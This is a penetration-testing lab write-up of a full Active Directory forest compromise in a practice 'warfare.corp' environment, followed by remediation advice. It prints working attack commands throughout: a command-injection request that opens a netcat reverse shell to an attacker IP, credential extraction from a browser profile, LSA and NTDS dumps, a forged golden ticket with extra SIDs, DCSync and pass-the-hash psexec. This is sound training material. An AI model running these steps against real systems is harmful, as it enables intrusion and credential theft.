# [CRW] Cyber Warfare Labs — Active Directory Domain Compromise

## 🎯 Engagement Overview

This assessment demonstrates how an initial unprivileged foothold on a Linux web server can be systematically escalated to achieve full Active Directory (AD) forest dominance. By chaining local misconfigurations, browser credential harvesting, lateral movement, and cross-domain Kerberos trust exploitation, the entire `warfare.corp` network environment was fully compromised.

* **Target Subnet:** `192.168.80.0/24` (External/DMZ) & `192.168.98.0/24` (Internal AD Forest)
* **Objectives:**
1. Establish initial foothold via web application vulnerabilities.
2. Perform local enumeration and escalate to system user accounts.
3. Pivot into the internal network and map out the Active Directory infrastructure.
4. Compromise the Child Domain (`child.warfare.corp`) and escalate to Domain Controller level.
5. Exploit cross-domain trust relationships to fully compromise the Forest Root Domain (`warfare.corp`).



---

## 🔍 Phase 1: External Reconnaissance & Host Discovery

### Network Discovery Sweep

A preliminary network scan was conducted using Nmap to discover active systems within the external subnet scope (`192.168.80.0/24`).

```bash
nmap -sn 192.168.80.0/24

```

| IP Address | Status | Notes |
| --- | --- | --- |
| `192.168.80.1` | Host Up | Likely the default gateway or network infrastructure device. |
| `192.168.80.10` | Host Up | Active target host (Potential Linux entry point / web server). |

### Detailed Port & Service Enumeration (`192.168.80.10`)

A full TCP port sweep, including service version identification and default script engine execution, was targeted against the active host:

```bash
nmap -p- -sS -sC -sV -O -T4 --min-rate 5000 192.168.80.10 -oN full.txt -v

```

```text
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 (Ubuntu 20.04)
80/tcp    open  http     Apache httpd 2.4.41 (Ubuntu)
|_http-title: Cyber WareFare Labs

```

* **Port 22 (SSH):** Running standard OpenSSH 8.2p1 on Ubuntu 20.04 LTS. Useful for solidifying future access once valid system credentials are leaked.
* **Port 80 (HTTP):** Running Apache httpd 2.4.41 with the page title "Cyber WareFare Labs". This web platform represents the primary attack surface.

### Virtual Host & Web Directory Enumeration

Initial virtual host brute-forcing using `ffuf` against `FUZZ.cyberwar.cy` returned no custom headers or unique response sizes, eliminating vhosts as an immediate path.

Efforts shifted to web directory and file routing discovery via `gobuster`:

```bash
gobuster dir -u http://cyberwar.cy -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x js,php,txt,html

```

| Path | Status Code | Context / Notes |
| --- | --- | --- |
| `/index.php` | 200 OK | Main application landing page. |
| `/search.php` | 200 OK | Search functionality endpoint; user input vector. |
| `/os.php` | 200 OK | Highly suspicious endpoint; potential administrative or debugging tool. |
| `/config.php` | 200 OK | Configuration file (Returned only 2 bytes, indicating execution without visible output). |
| `/report.php` / `/add.php` | 302 Redirect | Enforced application routing (Redirects unauthenticated traffic to index). |

---

## 🛠️ Phase 2: Web Exploitation & Initial Foothold

### Command Injection in `os.php`

Manual analysis of the `/os.php` script revealed that it accepted a parameter named `EMAIL`. Testing demonstrated that input supplied to this parameter was passed insecurely into a background shell execution context without adequate validation or sanitization.

A test payload containing a command separator (`;`) was intercepted and forwarded via Burp Suite:

```http
GET /os.php?EMAIL=test%40test.com;id HTTP/1.1
Host: 192.168.80.10
Cookie: PHPSESSID=6gvaf37s6mmla47dmg3l1eq85v

```

**Response Evidence:**

```html
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

The application successfully executed the arbitrary `id` command, echoing the current context as the low-privileged user `www-data`.

### Spawning an Interactive Reverse Shell

To upgrade from an unstable web exploitation state to an interactive console session, a `busybox` netcat reverse shell payload was crafted and URL-encoded:

```http
GET /os.php?EMAIL=test%40test.com;busybox%20nc%2010.10.200.32%20443%20-e%20bash HTTP/1.1

```

A listener caught the incoming connection on the attacker's terminal, which was subsequently stabilized into a full interactive TTY utilizing a Python standard library call:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu-virtual-machine:/var/www/html$ 

```

---

## 🔓 Phase 3: Local Enumeration & Privilege Escalation

### Configuration File Review & Database Dead-End

With active access on the web server directory, inspection of the deployment assets was conducted. Reading `config.php` exposed hardcoded root-level MySQL application database secrets:

```php
$host = "localhost";
$user = "root";
$password = 'Web!@#$%';
$db_name = "pro";

```

Logging directly into the local MySQL service allowed access to the underlying `pro.login` table:

```sql
SELECT * FROM login;
-- Result: Contained entry variables for "Test" and "test" accounts.

```

*Analysis Note:* While database access was successfully achieved, the harvested records consisted only of non-privileged test accounts that did not share credential structures with system accounts or Active Directory components.

### Identifying Vulnerable Sudo Utilities

Automated tools like `linPEAS` were dropped onto the host to locate local escalation points. The tool identified that `sudo` version `1.8.31` was deployed. While this version is typically susceptible to the Baron Samedit heap-based buffer overflow (CVE-2021-3156), the environmental context and runtime configurations blocked successful local exploit execution.

### Exploit via GECOS Metadata Leakage

Reverting to foundational system inspection, a dump of the system identity database (`/etc/passwd`) was executed to list local user groups:

```bash
cat /etc/passwd

```

```text
ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bash
privilege:x:1001:1001:Admin@962:/home/privilege:/bin/bash

```

*Critical Discovery:* The user comment field (GECOS metadata space) for the local account `privilege` contained an explicit cleartext string: `Admin@962`. This misconfiguration allowed an immediate pivot over SSH to obtain a stable, administrative foothold on the dual-homed server architecture.

```bash
ssh privilege@192.168.80.10
# Authenticated successfully via password: Admin@962

```

---

## 🛜 Phase 4: Network Pivoting & Active Directory Mapping

### Network Interface Enumeration

Investigating the active routing configurations using `ip route` confirmed that the host was multi-homed, exposing a bridge into the protected internal corporate infrastructure:

```text
192.168.80.0/24 dev ens32 src 192.168.80.10 (External Network DMZ)
192.168.98.0/24 dev ens34 src 192.168.98.15 (Internal Active Directory Segment)

```

Probing neighboring infrastructure on the newly discovered interface (`ens34`) via automated ARP requests mapped out multiple internal systems:

* `192.168.98.2`
* `192.168.98.30`
* `192.168.98.120`

### Establishing the Network Pivot Tunnel

To route internal exploit traffic from the external attacker platform directly through the multi-homed system into the target subnet, an encrypted transparent network tunnel was deployed using `sshuttle`:

```bash
sshuttle -r privilege@192.168.80.10 192.168.98.0/24

```

Upon verification, the local attack infrastructure could route all traffic to the `192.168.98.0/24` network segment directly.

### Target Directory Discovery Scan

An active service discovery sweep was performed against the internal live hosts, focused specifically on standard Active Directory, Kerberos, and administrative ports:

```bash
nmap -Pn -sT -sV -p 53,88,135,139,389,445,636,3268,3269,5985,5986 192.168.98.1,2,30,120 -oN ad_discovery.txt

```

### Infrastructure Mapping Table

| IP Address | Hostname | Active Ports / Services | Role / Summary |
| --- | --- | --- | --- |
| `192.168.98.2` | `DC01` | 53, 88, 135, 139, 389, 445, 3268, 5985 | **Forest Root Domain Controller** (`warfare.corp`). |
| `192.168.98.30` | `MGMT` | 135, 139, 445, 5985 | **Windows Management Workstation / Server**. |
| `192.168.98.120` | `CDC` | 53, 88, 135, 139, 389, 445, 3268, 5985 | **Child Domain Controller** (`child.warfare.corp`). |

*Note on Basic Shares:* Null session checks via NetExec (`nxc smb <IP> -u 'guest' -p '' --shares`) proved that while the endpoints allow initial protocol-level handshakes, unauthenticated guest account routing was strictly disabled across the network. Anonymous LDAP binds similarly failed, indicating valid authentication was mandatory to query the domain.

To facilitate smooth host routing, `/etc/hosts` was updated:

```text
192.168.98.2     warfare.corp dc01.warfare.corp
192.168.98.120   child.warfare.corp cdc.child.warfare.corp

```

---

## 🏹 Phase 5: Lateral Movement & Child Domain Compromise

### Browser Database Credential Extraction

To find applicable enterprise authentication markers, internal inspection turned back to the initial Ubuntu web host system. Searching through local user profiles led to an active Firefox application storage directory:

```bash
ls ~/.mozilla/firefox/*.default-release/

```

Extracting entries from the SQLite application database file `places.sqlite` uncovered an administrative bookmark path containing embedded URL credentials:

```text
http://192.168.98.30/admin/index.php?user=john@child.warfare.corp&pass=User1@#$%6

```

* **Recovered Account:** `john@child.warfare.corp`
* **Password:** `User1@#$%6`

### Accessing MGMT Server & Extracting LSA Secrets

The recovered credentials for `john` were utilized to run an authenticated credential extraction routine against the management host `192.168.98.30` over SMB via NetExec:

```bash
nxc smb 192.168.98.30 -u john -p 'User1@#$%6' --lsa

```

The dump revealed critical domain administrative session objects cached in the Local Security Authority (LSA) secrets vault:

* Cached DCC2 (MSCHAPv2) hashes for an enterprise manager account (`corpmngr`).
* An explicit plaintext service configuration credential associated with the `_SC_SNMPTRAP` handler:
* **Target User:** `corpmngr@child.warfare.corp`
* **Password:** `User4&*&*`



### Full NTDS Hashing Dump (`child.warfare.corp`)

Validating the access level of the new `corpmngr` account confirmed administrative command capability on the Child Domain Controller (`192.168.98.120`):

```bash
nxc smb 192.168.98.120 -u 'corpmngr' -p 'User4&*&*' -d child.warfare.corp

```

```text
(Pwn3d!) Windows Server 2019 (Build 17763) x64

```

With full local administrative rights confirmed, an NTDS database dump was performed to capture the security accounts database for the entire child active directory region:

```bash
nxc smb 192.168.98.120 -u 'corpmngr' -p 'User4&*&*' -d child.warfare.corp --ntds

```

**Key Hashes Extracted:**

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a8124cbf8513e07f1eeb0026c4d9de2:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e57dd34c1871b7a23fb17a77dec9b900:::
child.warfare.corp\corpmngr:1106:aad3b435b51404eeaad3b435b51404ee:4cb3933610b827a281ec479031128cc6:::

```

---

## 👑 Phase 6: Forest Trust Exploitation & Root Domain Compromise

### Active Domain SID Mapping

Security Identifier lookup testing via `lookupsid.py` identified the underlying configuration setup across the forest trust:

* **Parent Domain SID (`WARFARE`):** `S-1-5-21-3375883379-808943238-3239386119`
* **Child Domain SID (`CHILD.WARFARE`):** `S-1-5-21-3754860944-83624914-1883974761`

The domains operated under different SID scopes linked via a parent-child bidirectional trust structure.

### Forging an Inter-Domain Golden Ticket

To break across the structural trust boundary, an elevated Kerberos Ticket Granting Ticket (TGT) was forged. By leveraging the `krbtgt` AES key and adding structural groups like Enterprise Admins (`516`) via the `extra-sid` flag targeting the parent forest root namespace, cross-domain permissions were injected:

```bash
impacket-ticketer -domain child.warfare.corp \
  -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 \
  -domain-sid S-1-5-21-3754860944-83624914-1883974761 \
  -groups 516 \
  -user-id 1106 \
  -extra-sid S-1-5-21-3375883379-808943238-3239386119-516,S-1-5-9 \
  'corpmngr'

```

This action generated `corpmngr.ccache`. The object was then registered locally into the terminal shell context environment:

```bash
export KRB5CCNAME=corpmngr.ccache

```

### Requesting the Service Ticket (S4U)

Using the forged inter-domain TGT, a specific service ticket was requested from the parent domain Key Distribution Center (KDC) to authorize access to the CIFS handler on the Forest Root Domain Controller:

```bash
python3 getST.py -spn 'CIFS/dc01.warfare.corp' -k -no-pass child.warfare.corp/corpmngr -debug

```

The application established successful cross-domain authentication, caching the operational ticket: `corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache`.

### Root Domain Controller NTDS Extraction

With the forged Kerberos ticket actively mapped, a DCSync operation was triggered via the Directory Replication Service Remote Protocol (MS-DRSR) directly against the Forest Root DC (`dc01.warfare.corp`):

```bash
impacket-secretsdump -k -no-pass dc01.warfare.corp -just-dc-user 'warfare\Administrator'

```

**Extracted High-Value Hash:**

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b2ab0552928c8399da5161a9eb7fd283:::

```

---

## 🏁 Phase 7: Complete Infrastructure Domination

### Spawning a SYSTEM Interactive Shell via PsExec

To complete the domain takeover, the extracted `WARFARE\Administrator` NTLM hash was leveraged to perform a Pass-the-Hash (PtH) execution loop against the root Domain Controller via `impacket-psexec`:

```bash
impacket-psexec warfare.corp/Administrator@dc01.warfare.corp -hashes :b2ab0552928c8399da5161a9eb7fd283

```

The execution vector successfully authenticated via SMB, identified a writable administrative share (`ADMIN$`), dropped the operational service handler payload, and initialized the background task.

```text
[*] Requesting shares...
[*] Found writable ADMIN$ share.
[*] Uploading file cdtb.exe...
[*] Creating service...
[*] Starting service...
[+] Greater access achieved! Interactive shell spawned:

Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami /priv
nt authority\system

```

**Outcome:** Full infrastructure compromise confirmed at the highest structural level (`NT AUTHORITY\SYSTEM`) on the primary Active Directory forest root domain controller.

---

## 📝 Recommendations & Remediation Plan

1. **Fix Insecure Command Executions:** Remediate the application layer logic in `/os.php`. Implement strict input validation or migrate completely to parameterized email ingestion tools rather than calling direct OS commands via shell execution contexts.
2. **Eliminate Credentials in Metadata Fields:** Sanitize all user record objects across Linux environments. Explicit cleartext deployment passwords must never be stored inside user comment fields (GECOS) or descriptions.
3. **Enforce Browser Hardening Policies:** Enforce enterprise group guidelines to restrict the retention of operational administrative infrastructure passwords in cleartext inside local browser profiles or bookmark configuration registries.
4. **Hardened Forest Trust Boundaries:** Restrict SID filtering settings across the Active Directory forest domain boundary. Ensure that cross-domain authentication pathways strictly enforce validation routines to block the elevation of nested child group members into Forest Root Enterprise administrative tiers.
